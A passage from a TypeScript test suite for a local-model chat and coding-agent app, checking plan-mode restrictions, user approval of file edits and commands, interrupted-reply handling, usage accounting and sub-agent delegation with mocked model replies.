    expect(service.setStage(session.id, 'work')).toMatchObject({ stage: 'work', plan: null })
    events.length = 0
    const next = service.send({ ...sendBody(session.id), content: 'and now?' })
    await doneEvent(next.conversation.id)
    expect((chatCalls[1].messages as Array<{ content: string }>)[0].content).not.toMatch(/<approved_plan>/)
    // A chat has no stage to set.
    chat = reply('hello')
    await waitFor(() => !service.isReplying())
    const plain = start('hi')
    await doneEvent(plain.conversation.id)
    await waitFor(() => !service.isReplying())
    expect(() => service.setStage(plain.conversation.id, 'plan')).toThrow(/code session/i)
  })

  it('takes the tools away after a second round of nothing but refused writes in plan mode', async () => {
    const { paths } = await import('../src/main/paths')
    const { mkdtempSync, realpathSync, writeFileSync } = await import('node:fs')
    const { tmpdir } = await import('node:os')
    const { join } = await import('node:path')
    const dir = mkdtempSync(join(tmpdir(), 'ollmost-service-plan-'))
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(mkdtempSync(join(tmpdir(), 'ollmost-user-repo-')))
    writeFileSync(join(folder, 'README.md'), 'Hello\n')
    const session = createConversation({
      projectId: null,
      model: 'llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    service.setStage(session.id, 'plan')
    chat = (b, res, n) =>
      n <= 2
        ? void res.writeHead(200).end(toolCall('edit_file', { path: 'README.md', old_string: 'Hello', new_string: 'Bonjour' }))
        : reply('Fine, here is the plan.')(b, res, n)
    const r = service.send({ ...sendBody(session.id), content: 'just do it' })
    await doneEvent(r.conversation.id)
    const offered = (calls: number) => ((chatCalls[calls].tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)
    expect(offered(1)).toContain('read_file')
    expect(offered(2)).toEqual([])
  })

  it('keeps no plan from a reply the user stopped', async () => {
    const { paths } = await import('../src/main/paths')
    const { mkdtempSync, realpathSync } = await import('node:fs')
    const { tmpdir } = await import('node:os')
    const { join } = await import('node:path')
    const dir = mkdtempSync(join(tmpdir(), 'ollmost-service-plan-'))
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(mkdtempSync(join(tmpdir(), 'ollmost-user-repo-')))
    const session = createConversation({
      projectId: null,
      model: 'llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    service.setStage(session.id, 'plan')
    chat = (_b, res) => streamChunks(res, [line({ message: { role: 'assistant', content: 'Half a plan' }, done: false })]) // then hangs
    const r = service.send({ ...sendBody(session.id), content: 'plan it' })
    await waitFor(() => events.some((e) => e.type === 'delta' && e.conversationId === r.conversation.id))
    await service.stop(r.conversation.id, { quiet: true })
    expect(getMessage(r.assistantMessageId)?.content).toBe('Half a plan')
    expect(getConversation(session.id)?.plan).toBeNull()
  })

  it('refuses an edit the model attempts in plan mode', async () => {
    const { paths } = await import('../src/main/paths')
    const { mkdtempSync, realpathSync, writeFileSync, readFileSync } = await import('node:fs')
    const { tmpdir } = await import('node:os')
    const { join } = await import('node:path')
    const dir = mkdtempSync(join(tmpdir(), 'ollmost-service-plan-'))
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(mkdtempSync(join(tmpdir(), 'ollmost-user-repo-')))
    writeFileSync(join(folder, 'README.md'), 'Hello\n')
    const session = createConversation({
      projectId: null,
      model: 'llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    service.setStage(session.id, 'plan')
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(toolCall('edit_file', { path: 'README.md', old_string: 'Hello', new_string: 'Bonjour' }))
        : reply('I cannot edit in plan mode.')(b, res, n)
    const r = service.send({ ...sendBody(session.id), content: 'just do it' })
    const done = await doneEvent(r.conversation.id)
    expect(readFileSync(join(folder, 'README.md'), 'utf8')).toBe('Hello\n')
    expect(done.message.toolEvents[0]).toMatchObject({ tool: 'edit_file', ok: false })
    // A refusal, not an unknown tool: the model is told why, and keeps its reading tools for the rest of the reply.
    expect(done.message.toolEvents[0].unknown).toBeUndefined()
    const told = (chatCalls[1].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(told[0].content).toMatch(/plan mode/i)
    const offered = ((chatCalls[1].tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)
    expect(offered).toEqual(expect.arrayContaining(['read_file', 'list_files', 'search_files']))
    expect(offered).not.toContain('edit_file')
    expect(events.some((e) => e.type === 'tool' && e.conversationId === r.conversation.id && !!e.event.awaiting)).toBe(false)
  })

  it('runs a command in a session’s folder after asking, and remembers Allow for this session', async () => {
    const { paths } = await import('../src/main/paths')
    const { mkdtempSync, realpathSync, writeFileSync, existsSync } = await import('node:fs')
    const { tmpdir } = await import('node:os')
    const { join } = await import('node:path')
    const dir = mkdtempSync(join(tmpdir(), 'ollmost-service-session-'))
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(mkdtempSync(join(tmpdir(), 'ollmost-user-repo-')))
    writeFileSync(join(folder, 'CLAUDE.md'), 'Say hello in French.')
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(toolCall('run_command', { command: 'echo bonjour > greeting.txt && cat greeting.txt' }))
        : reply('Done: bonjour.')(b, res, n)
    const session = createConversation({
      projectId: null,
      model: 'llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    const r = service.send({
      conversationId: session.id,
      projectId: null,
      content: 'make a greeting file',
      attachmentIds: [],
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    const ask = await waitFor(
      () =>
        events.find(
          (e): e is Extract<ChatEvent, { type: 'tool' }> =>
            e.type === 'tool' && e.conversationId === r.conversation.id && !!e.event.awaiting
        ),
      30_000
    )
    expect(ask.event).toMatchObject({ tool: 'run_command', args: { command: 'echo bonjour > greeting.txt && cat greeting.txt' } })
    const system = (chatCalls[0].messages as Array<{ content: string }>)[0].content
    expect(system).toMatch(/coding agent running inside Ollmost/)
    expect(system).toMatch(new RegExp(`working in the folder ${folder}`))
    expect(system).toMatch(/<project_instructions file="CLAUDE\.md">[\s\S]*Say hello in French/)
    expect(system).not.toMatch(/<artifacts>|<code_runner>/)
    const offered = ((chatCalls[0].tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)
    expect(offered).toContain('run_command')
    expect(offered).not.toContain('run_code')
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'chat')
    const done = await waitFor(
      () => events.find((e): e is Extract<ChatEvent, { type: 'done' }> => e.type === 'done' && e.conversationId === r.conversation.id),
      60_000
    )
    const results = (chatCalls[1].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(results[0].content).toMatch(/^Exit code 0\.\n\nbonjour/)
    expect(done.message.toolEvents[0]).toMatchObject({
      tool: 'run_command',
      ok: true,
      summary: 'echo bonjour > greeting.txt && cat greeting.txt'
    })
    expect(existsSync(join(folder, 'greeting.txt'))).toBe(true)
    expect(getConversation(session.id)!.allowedTools).toEqual(['code:commands'])
    expect(existsSync(join(dir, 'runner', 'sessions', session.id, 'home'))).toBe(true)
    // The session's title stays: only a 'New chat' gets titled (an earlier test's title request may still arrive here).
    await new Promise((resolve) => setTimeout(resolve, 300))
    expect(titleCalls.some((t) => JSON.stringify(t).includes('make a greeting file'))).toBe(false)
    expect(getConversation(session.id)!.title).toBe('repo')
  }, 120_000)

  // #93: a session's file tools in one turn: a read that runs unasked, an edit that asks and shows its diff, then a
  // command that asks under its own key.
  it('reads, edits after asking with a diff, and runs a command, in one turn', async () => {
    const { paths } = await import('../src/main/paths')
    const { mkdtempSync, realpathSync, writeFileSync, readFileSync } = await import('node:fs')
    const { tmpdir } = await import('node:os')
    const { join } = await import('node:path')
    const dir = mkdtempSync(join(tmpdir(), 'ollmost-service-files-'))
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(mkdtempSync(join(tmpdir(), 'ollmost-user-repo-')))
    writeFileSync(join(folder, 'hello.py'), 'print("hello")\n')
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(toolCall('read_file', { path: 'hello.py' }))
        : n === 2
          ? void res.writeHead(200).end(toolCall('edit_file', { path: 'hello.py', old_string: 'hello', new_string: 'bonjour' }))
          : n === 3
            ? void res.writeHead(200).end(toolCall('run_command', { command: 'cat hello.py' }))
            : reply('Changed the greeting.')(b, res, n)
    const session = createConversation({
      projectId: null,
      model: 'llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    const r = service.send({
      conversationId: session.id,
      projectId: null,
      content: 'say bonjour instead',
      attachmentIds: [],
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    const asks = (index: number) =>
      waitFor(
        () =>
          events.find(
            (e): e is Extract<ChatEvent, { type: 'tool' }> =>
              e.type === 'tool' && e.conversationId === r.conversation.id && e.index === index && !!e.event.awaiting
          ),
        30_000
      )
    const edit = await asks(1)
    expect(edit.event).toMatchObject({
      tool: 'edit_file',
      args: { path: 'hello.py', old_string: 'hello', new_string: 'bonjour' },
      diff: '--- a/hello.py\n+++ b/hello.py\n@@ -1,1 +1,1 @@\n-print("hello")\n+print("bonjour")'
    })
    // The read ran unasked, and the model got the numbered file.
    const offered = ((chatCalls[0].tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)
    expect(offered).toEqual(['read_file', 'list_files', 'search_files', 'edit_file', 'write_file', 'run_command', 'delegate'])
    const results = (i: number) => (chatCalls[i].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(results(1)[0].content).toBe('hello.py (1 line)\n\n     1\tprint("hello")')
    approvals.decide(r.conversation.id, edit.messageId, edit.index, 'chat')
    const command = await asks(2)
    expect(command.event).toMatchObject({ tool: 'run_command', args: { command: 'cat hello.py' } })
    expect(results(2)[1].content).toMatch(/^Edited hello\.py \(\+1 −1\)\.\n\n--- a\/hello\.py/)
    approvals.decide(r.conversation.id, command.messageId, command.index, 'once')
    const done = await waitFor(
      () => events.find((e): e is Extract<ChatEvent, { type: 'done' }> => e.type === 'done' && e.conversationId === r.conversation.id),
      60_000
    )
    expect(results(3)[2].content).toMatch(/^Exit code 0\.\n\nprint\("bonjour"\)/)
    expect(done.message.toolEvents.map((e) => [e.tool, e.ok, e.summary])).toEqual([
      ['read_file', true, '1 line'],
      ['edit_file', true, '+1 −1'],
      ['run_command', true, 'cat hello.py']
    ])
    expect(done.message.toolEvents[1]).toMatchObject({ files: [{ path: 'hello.py', size: 17 }] })
    expect(done.message.toolEvents[1].diff).toMatch(/^--- a\/hello\.py/)
    expect(readFileSync(join(folder, 'hello.py'), 'utf8')).toBe('print("bonjour")\n')
    // Allow for this session covered the edit; the command was allowed once.
    expect(getConversation(session.id)!.allowedTools).toEqual(['code:edits'])
  }, 120_000)

  it('doesn’t ask about an edit that can’t be made: the model gets the failure', async () => {
    const { paths } = await import('../src/main/paths')
    const { mkdtempSync, realpathSync, writeFileSync, readFileSync } = await import('node:fs')
    const { tmpdir } = await import('node:os')
    const { join } = await import('node:path')
    const dir = mkdtempSync(join(tmpdir(), 'ollmost-service-refused-'))
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(mkdtempSync(join(tmpdir(), 'ollmost-user-repo-')))
    writeFileSync(join(folder, 'hello.py'), 'print("hello")\n')
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(toolCall('edit_file', { path: 'hello.py', old_string: 'goodbye', new_string: 'bonjour' }))
        : reply('Nothing to change.')(b, res, n)
    const session = createConversation({
      projectId: null,
      model: 'llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    const r = service.send({
      conversationId: session.id,
      projectId: null,
      content: 'say bonjour instead of goodbye',
      attachmentIds: [],
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    const done = await waitFor(
      () => events.find((e): e is Extract<ChatEvent, { type: 'done' }> => e.type === 'done' && e.conversationId === r.conversation.id),
      60_000
    )
    expect(events.filter((e) => e.type === 'tool' && e.conversationId === r.conversation.id && e.event.awaiting)).toEqual([])
    expect(done.message.toolEvents.map((e) => [e.tool, e.ok, e.summary])).toEqual([['edit_file', false, 'old_string not found']])
    const results = (chatCalls[1].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(results[0].content).toMatch(/^Error: old_string was not found in hello\.py/)
    expect(readFileSync(join(folder, 'hello.py'), 'utf8')).toBe('print("hello")\n')
    expect(getConversation(session.id)!.allowedTools).toEqual([])
  }, 60_000)

  it('says when a session’s folder is gone, and offers no code tools that turn', async () => {
    const { mkdtempSync, realpathSync, rmSync } = await import('node:fs')
    const { tmpdir } = await import('node:os')
    const { join } = await import('node:path')
    const folder = realpathSync(mkdtempSync(join(tmpdir(), 'ollmost-user-gone-')))
    const session = createConversation({
      projectId: null,
      model: 'llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'gone'
    })
    rmSync(folder, { recursive: true })
    chat = reply('I cannot see the folder.')
    const r = service.send({
      conversationId: session.id,
      projectId: null,
      content: 'hi',
      attachmentIds: [],
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    const done = await doneEvent(r.conversation.id)
    expect(done.message.stats?.unavailableTools?.[0]).toMatch(
      /This session's tools aren't available: This session's folder is no longer at/
    )
    expect(chatCalls[0].tools).toBeUndefined()
    expect((chatCalls[0].messages as Array<{ content: string }>)[0].content).toMatch(/coding agent/)
  })
})

describe('markInterruptedReplies', () => {
  it('flags replies that never got their final save, and only those', () => {
    const c = createConversation({ projectId: null, model: 'llama3.2', think: null, skills: [], toolSources: [] })
    const user = insertMessage({ conversationId: c.id, parentId: null, role: 'user', content: 'hi' })
    const cut = insertMessage({ conversationId: c.id, parentId: user.id, role: 'assistant', content: '' })
    // A checkpoint wrote text and a running tool, then the app died.
    updateMessage(cut.id, {
      content: 'so far',
      toolEvents: [
        { tool: 'web_search', args: {}, ok: true, pending: true, summary: 'ollmost' },
        { tool: 'notes__delete', args: {}, ok: true, pending: true, awaiting: true, summary: 'note 7' }
      ]
    })
    const finished = insertMessage({ conversationId: c.id, parentId: user.id, role: 'assistant', content: 'done' })
    updateMessage(finished.id, { stats: { promptTokens: 1, completionTokens: 1 } })

    expect(service.markInterruptedReplies()).toBeGreaterThanOrEqual(1)
    const after = getMessage(cut.id)!
    expect(after.content).toBe('so far')
    expect(after.error).toMatch(/closed before this reply finished/)
    expect(after.toolEvents[0]).toMatchObject({ pending: false, ok: false })
    // A call still waiting for an answer never ran.
    expect(after.toolEvents[1]).toEqual({ tool: 'notes__delete', args: {}, ok: false, pending: false, summary: 'note 7 (not run)' })
    // Checkpoints skip search indexing; marking the reply indexes the text it kept.
    expect(search('so far').map((h) => h.conversationId)).toContain(c.id)
    expect(getMessage(finished.id)!.error).toBeNull()
  })
})

describe('sub-agent settings and usage', () => {
  it('defaults sub-agents to on, capped at 20 rounds', () => {
    expect(getSettings().delegate).toEqual({ enabled: true, maxRounds: 20 })
  })

  it('counts a sub-agent’s rows in the chat’s totals but not as its context', () => {
    const c = createConversation({ projectId: null, model: 'm', think: null, skills: [], mode: 'chat' })
    insertUsageEvent({
      conversationId: c.id,
      messageId: null,
      model: 'm',
      kind: 'chat',
      promptTokens: 100,
      completionTokens: 10,
      costUsd: null,
      estimated: false
    })
    insertUsageEvent({
      conversationId: c.id,
      messageId: null,
      model: 'm',
      kind: 'delegate',
      promptTokens: 5000,
      completionTokens: 50,
      costUsd: null,
      estimated: false
    })
    const u = conversationUsage(c.id)
    expect(u.promptTokens + u.completionTokens).toBe(5160)
    expect(u.lastContextTokens).toBe(110)
  })
})

describe('runRounds', () => {
  // A tool that runs unasked and says back what it was given.
  const echo: ToolProvider = {
    id: 'echo-test',
    tools: () => [
      {
        type: 'function',
        function: { name: 'echo', description: 'echo', parameters: { type: 'object', properties: { text: { type: 'string' } } } }
      }
    ],
    pending: (call) => ({ tool: 'echo', args: call.args, ok: true, pending: true, summary: 'echoing' }),
    approval: () => 'auto',
    run: async (call) => ({
      content: `echo: ${String(call.args.text)}`,
      event: { tool: 'echo', args: call.args, ok: true, summary: 'echoed' }
    })
  }

  async function setup() {
    const conversation = createConversation({ projectId: null, model: 'llama3.2', think: null, skills: [], mode: 'chat' })
    const message = insertMessage({ conversationId: conversation.id, parentId: null, role: 'assistant', content: '', model: 'llama3.2' })
    const model = await getModelInfo('llama3.2')
    const body: RoundsInput['body'] = {
      model: 'llama3.2',
      messages: [
        { role: 'system', content: 'test' },
        { role: 'user', content: 'hi' }
      ],
      tools: echo.tools({ mode: 'chat', skills: false, web: false, sources: [], workspace: null })
    }
    const stats: MessageStats = { promptTokens: 0, completionTokens: 0 }
    const seen: Array<[number, boolean]> = []
    const usage: number[] = []
    const input: RoundsInput = {
      conversationId: conversation.id,
      messageId: message.id,
      loopId: 'loop-1',
      modelName: 'llama3.2',
      model,
      body,
      budget: 8000,
      maxRounds: 4,
      toolContext: { mode: 'chat', skills: false, web: false, sources: [], workspace: null },
      signal: new AbortController().signal,
      stats,
      usageKind: 'delegate',
      traceKind: 'delegate',
      onDelta: () => {},
      onToolEvent: (index, event) => seen.push([index, !!event.pending]),
      onUsage: () => usage.push(1),
      onLoadedSkill: () => {},
      checkpoint: () => {}
    }
    return { conversation, message, body, stats, seen, usage, input }
  }

  it('runs a tool round then an answer, keyed by its own loop id and usage kind', async () => {
    const off = registerToolProvider(echo)
    try {
      chat = (b, res, n) => (n === 1 ? void res.writeHead(200).end(toolCall('echo', { text: 'hi' })) : reply('done')(b, res, n))
      const { conversation, message, body, stats, seen, usage, input } = await setup()
      const out = await runRounds(input)
      expect(out.content).toBe('done')
      expect(out.rounds).toBe(2)
      expect(out.error).toBeNull()
      expect(out.toolEvents).toEqual([expect.objectContaining({ tool: 'echo', ok: true, at: 0 })])
      expect(seen).toEqual([
        [0, true],
        [0, false]
      ])
      expect(usage).toHaveLength(1)
      expect(body.messages.map((m) => m.role)).toEqual(['system', 'user', 'assistant', 'tool'])
      expect(stats.promptTokens).toBeGreaterThan(0)
      // Traces go under the loop's id; usage rows under the message, with the loop's kind.
      const traces = listTraces(conversation.id)
      expect(traces.filter((t) => t.kind === 'delegate').map((t) => t.messageId)).toEqual(['loop-1', 'loop-1'])
      expect(traces.filter((t) => t.kind === 'tool').map((t) => t.messageId)).toEqual(['loop-1'])
      const rows = all<{ kind: string; message_id: string }>(
        'SELECT kind, message_id FROM usage_events WHERE conversation_id = ?',
        conversation.id
      )
      expect(rows).toEqual([
        { kind: 'delegate', message_id: message.id },
        { kind: 'delegate', message_id: message.id }
      ])
      expect(conversationUsage(conversation.id).promptTokens).toBeGreaterThan(0)
    } finally {
      off()
    }
  })

  it('withdraws tools on the last round', async () => {
    const off = registerToolProvider(echo)
    try {
      chat = (b, res, n) => (n < 2 ? void res.writeHead(200).end(toolCall('echo', { text: String(n) })) : reply('end')(b, res, n))
      const { input, stats } = await setup()
      const out = await runRounds({ ...input, maxRounds: 2 })
      expect(out.content).toBe('end')
      expect(out.rounds).toBe(2)
      expect(chatCalls[0].tools).toBeDefined()
      expect(chatCalls[1].tools).toBeUndefined()
      expect(stats.toolRoundLimit).toBe(2)
    } finally {
      off()
    }
  })

  it('ends quietly when stopped mid-stream, with the round traced as aborted', async () => {
    const controller = new AbortController()
    // Sends a first piece and then hangs, as a model still writing does; the first piece stops it.
    chat = (_b, res) => streamChunks(res, [line({ message: { role: 'assistant', content: 'part' }, done: false })])
    const { conversation, input } = await setup()
    const out = await runRounds({
      ...input,
      signal: controller.signal,
      onDelta: (d) => {
        if (d.content) controller.abort()
      }
    })
    expect(out.content).toBe('part')
    expect(out.error).toBeNull()
    expect(out.rounds).toBe(1)
    expect(listTraces(conversation.id).find((t) => t.kind === 'delegate')?.status).toBe('aborted')
  })
})

describe('sub-agents', () => {
  const isChild = (b: Record<string, unknown>) => String((b.messages as Array<{ content: string }>)[0].content).includes('<sub_agent>')
  const hasToolResult = (b: Record<string, unknown>) => (b.messages as Array<{ role: string }>).some((m) => m.role === 'tool')
  const toolResults = (b: Record<string, unknown>) => (b.messages as Array<{ role: string }>).filter((m) => m.role === 'tool').length
  const delegateCall = (task: string) => toolCall('delegate', { task })
  const offeredIn = (b: Record<string, unknown>) => ((b.tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)
  const toolEventsIn = (conversationId: string) =>
    events.filter((e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === conversationId)
  const toolMessageIn = (b: Record<string, unknown>) =>
    (b.messages as Array<{ role: string; content: string }>).find((m) => m.role === 'tool')!.content
  /** The reply a delegate call belongs to, as generate() describes it. */
  const parentReply = (conversationId: string, messageId: string): ToolContext['reply'] => ({
    conversationId,
    messageId,
    model: 'llama3.2',
    think: null,
    maxRounds: 10,
    prompt: { userName: '', model: 'llama3.2', contextLength: 8192, web: 'on', skillIndex: [] }
  })
  /** A tool that acts on this Mac: it asks first, and can be allowed for the chat. */
  const registerWipe = () => {
    const runs: string[] = []
    const off = registerToolProvider({
      id: 'wipe-test',
      tools: () => [{ type: 'function', function: { name: 'notes__wipe', description: 'Wipe a note', parameters: { type: 'object' } } }],
      pending: ({ name, args }) => ({ tool: name, args, ok: true, pending: true, summary: 'wiping' }),
      run: async ({ name, args }) => {
        runs.push(name)
        return { content: 'Wiped.', event: { tool: name, args, ok: true, summary: 'wiped' } }
      },
      approval: () => 'ask'
    })
    return { runs, off }
  }

  beforeEach(() => setApiKey('test-key')) // web tools on, so delegate is offered

  it('runs a child on the task and gives the parent only its result', async () => {
    chat = (b, res, n) => {
      if (isChild(b))
        return hasToolResult(b)
          ? reply('The headline is OLLMOST-CHILD-OK.')(b, res, n)
          : void res.writeHead(200).end(toolCall('web_search', { query: 'ollmost' }))
      return hasToolResult(b)
        ? reply('The sub-agent found: OLLMOST-CHILD-OK.')(b, res, n)
        : void res.writeHead(200).end(delegateCall('Search for ollmost and report the headline.'))
    }
    web = (_p, res) =>
      res.writeHead(200).end(JSON.stringify({ results: [{ title: 'Ollmost', url: 'https://k.io', content: 'OLLMOST-CHILD-OK' }] }))
    const r = start('find the headline')
    const done = await doneEvent(r.conversation.id)
    expect(done.message.content).toBe('The sub-agent found: OLLMOST-CHILD-OK.')
    const [event] = done.message.toolEvents
    expect(event).toMatchObject({ tool: 'delegate', ok: true, summary: 'Search for ollmost and report the headline. · 1 tool call' })
    expect(event.pending).toBeUndefined()
    expect(event.child).toMatchObject({
      task: 'Search for ollmost and report the headline.',
      result: 'The headline is OLLMOST-CHILD-OK.',
      rounds: 2
    })
    expect(event.child!.events).toEqual([expect.objectContaining({ tool: 'web_search', ok: true })])
    // The parent's request after the call carries the child's reply, not its reading.
    const parentAfter = chatCalls.find((b) => !isChild(b) && hasToolResult(b))!
    const toolMsg = (parentAfter.messages as Array<{ role: string; content: string }>).find((m) => m.role === 'tool')!
    expect(toolMsg.content).toBe('The headline is OLLMOST-CHILD-OK.')
    expect(toolMsg.content).not.toContain('k.io')
    // The child was offered no delegate of its own; the parent was.
    const childReq = chatCalls.find(isChild)!
    expect(offeredIn(childReq)).not.toContain('delegate')
    expect(offeredIn(chatCalls[0])).toContain('delegate')
    expect(String((chatCalls[0].messages as Array<{ content: string }>)[0].content)).toContain('<sub_agents>')
    // Billed on the chat as delegate rows; traced as the child's own turn.
    const rows = all<{ kind: string; message_id: string }>(
      'SELECT kind, message_id FROM usage_events WHERE conversation_id = ? AND kind = ?',
      r.conversation.id,
      'delegate'
    )
    expect(rows).toEqual([
      { kind: 'delegate', message_id: r.assistantMessageId },
      { kind: 'delegate', message_id: r.assistantMessageId }
    ])
    const traces = listTraces(r.conversation.id)
    expect(traces.filter((t) => t.kind === 'delegate').every((t) => t.messageId === `${r.assistantMessageId}#0`)).toBe(true)
    expect(traces.filter((t) => t.kind === 'delegate')).toHaveLength(2)
    expect(traces.every((t) => t.status !== 'running')).toBe(true)
    // Live: the parent's event was re-emitted with the child's search while it ran.
    const live = toolEventsIn(r.conversation.id).find((e) => e.event.pending && e.event.child?.events.some((c) => c.tool === 'web_search'))
    // Its search came from the child's first request.
    expect(live?.event.child?.rounds).toBe(1)
  })

  it('moves the chat’s usage chip on a child’s own request, not only when the parent’s round ends', async () => {
    chat = (b, res, n) => {
      if (isChild(b))
        return hasToolResult(b)
          ? reply('The headline is OLLMOST-CHILD-OK.')(b, res, n)
          : void res.writeHead(200).end(toolCall('web_search', { query: 'ollmost' }))
      return hasToolResult(b)
        ? reply('The sub-agent found: OLLMOST-CHILD-OK.')(b, res, n)
        : void res.writeHead(200).end(delegateCall('Search for ollmost and report the headline.'))
    }
    web = (_p, res) =>
      res.writeHead(200).end(JSON.stringify({ results: [{ title: 'Ollmost', url: 'https://k.io', content: 'OLLMOST-CHILD-OK' }] }))
    const r = start('find the headline')
    const done = await doneEvent(r.conversation.id)
    const doneIndex = events.indexOf(done)
    // Before the reply is done (a title request afterwards ticks the chip too, but that's not what's under test).
    const usage = events
      .slice(0, doneIndex)
      .filter((e): e is Extract<ChatEvent, { type: 'usage' }> => e.type === 'usage' && e.conversationId === r.conversation.id)
    // One tick for the parent's own round (the delegate call itself), and a second for the child's first
    // request — not just the one tick the parent's round alone would give.
    expect(usage.length).toBeGreaterThanOrEqual(2)
    const rows = all<{ kind: string }>(
      'SELECT kind FROM usage_events WHERE conversation_id = ? AND kind = ?',
      r.conversation.id,
      'delegate'
    )
    expect(rows.length).toBeGreaterThan(0)
    // The second tick already counts the child's row: its running total is past the first tick's.
    expect(usage[1].usage.promptTokens + usage[1].usage.completionTokens).toBeGreaterThan(
      usage[0].usage.promptTokens + usage[0].usage.completionTokens
    )
  })

  it('is offered beside another tool, and never to a child or outside a reply', async () => {
    const { delegateTools } = await import('../src/main/chat/delegate')
    const offered = (over: Partial<ToolContext>) =>
      delegateTools
        .tools({ mode: 'chat', skills: false, web: false, sources: [], workspace: null, reply: parentReply('c', 'm'), ...over })
        .map((t) => t.function.name)
    expect(offered({ web: true })).toEqual(['delegate'])
    // Skills alone give a sub-agent nothing to do.
    expect(offered({ skills: true })).toEqual([])
    // The code runner, when run_code is offered: switched on with a workspace of Ollmost's own readied.
    expect(offered({ sources: ['code'], workspace: { owned: true } as Workspace })).toEqual(['delegate'])
    expect(offered({ sources: ['code'] })).toEqual([])
    // An MCP server switched on counts by the tools it offers.
    expect(offered({ sources: ['mcp:not-running'] })).toEqual([])
    const off = registerToolProvider({
      id: 'notes',
      tools: () => [{ type: 'function', function: { name: 'notes__search', description: 'Search notes', parameters: { type: 'object' } } }],
      pending: ({ name, args }) => ({ tool: name, args, ok: true, pending: true, summary: '' }),
      run: async ({ name, args }) => ({ content: '', event: { tool: name, args, ok: true, summary: '' } })
    })
    try {
      expect(offered({})).toEqual(['delegate'])
    } finally {
      off()
    }
    expect(offered({ web: true, child: true })).toEqual([])
    expect(offered({ web: true, reply: undefined })).toEqual([])
  })

  it('is not offered without tools to delegate to, nor when switched off', async () => {
    setApiKey('')
    chat = reply('plain')
    const r = start('hi')
    await doneEvent(r.conversation.id)
    expect(offeredIn(chatCalls[0])).not.toContain('delegate')
    expect(String((chatCalls[0].messages as Array<{ content: string }>)[0].content)).not.toContain('<sub_agents>')
    setApiKey('test-key')
    updateSettings({ delegate: { enabled: false, maxRounds: 20 } })
    try {
      chat = reply('plain')
      const r2 = start('hi again')
      await doneEvent(r2.conversation.id)
      expect(offeredIn(chatCalls.at(-1)!)).toContain('web_search')
      expect(offeredIn(chatCalls.at(-1)!)).not.toContain('delegate')
    } finally {
      updateSettings({ delegate: { enabled: true, maxRounds: 20 } })
    }
  })

  it('a child that runs out of rounds returns what it had, with a note', async () => {
    updateSettings({ delegate: { enabled: true, maxRounds: 2 } })
    try {
      chat = (b, res, n) => {
        if (isChild(b))
          return b.tools
            ? void res
                .writeHead(200)
                .end(line({ message: { role: 'assistant', content: 'Partial. ' }, done: false }) + toolCall('web_search', { query: 'x' }))
            : reply('Still partial.')(b, res, n)
        return hasToolResult(b) ? reply('ok')(b, res, n) : void res.writeHead(200).end(delegateCall('Loop forever.'))
      }
      web = (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [] }))
      const r = start('loop')
      const done = await doneEvent(r.conversation.id)
      expect(done.message.toolEvents[0].child?.result).toContain('stopped at its limit of 2 requests')
      expect(done.message.toolEvents[0].child?.result).toContain('Still partial.')
      expect(done.message.toolEvents[0].child?.rounds).toBe(2)
    } finally {
      updateSettings({ delegate: { enabled: true, maxRounds: 20 } })
    }
  })

  it('an approval inside the child is keyed by the child’s id and stored on the chat', async () => {
    const { childId } = await import('../src/main/chat/delegate')
    const { runs, off } = registerWipe()
    try {
      chat = (b, res, n) => {
        if (isChild(b)) return hasToolResult(b) ? reply('Wiped it.')(b, res, n) : void res.writeHead(200).end(toolCall('notes__wipe', {}))
        // Then the parent calls the same tool itself: allowed for the chat inside the child, it runs unasked.
        const results = toolResults(b)
        if (results === 0) return void res.writeHead(200).end(delegateCall('Wipe the note.'))
        if (results === 1) return void res.writeHead(200).end(toolCall('notes__wipe', {}))
        return reply('done')(b, res, n)
      }
      const r = start('wipe it')
      const waiting = await waitFor(() => toolEventsIn(r.conversation.id).find((e) => !!e.event.child?.events.some((c) => c.awaiting)))
      // The parent's card carries the question up, and is saved at once, as the parent's own questions are.
      expect(waiting).toMatchObject({ index: 0, event: { tool: 'delegate', awaiting: true, pending: true } })
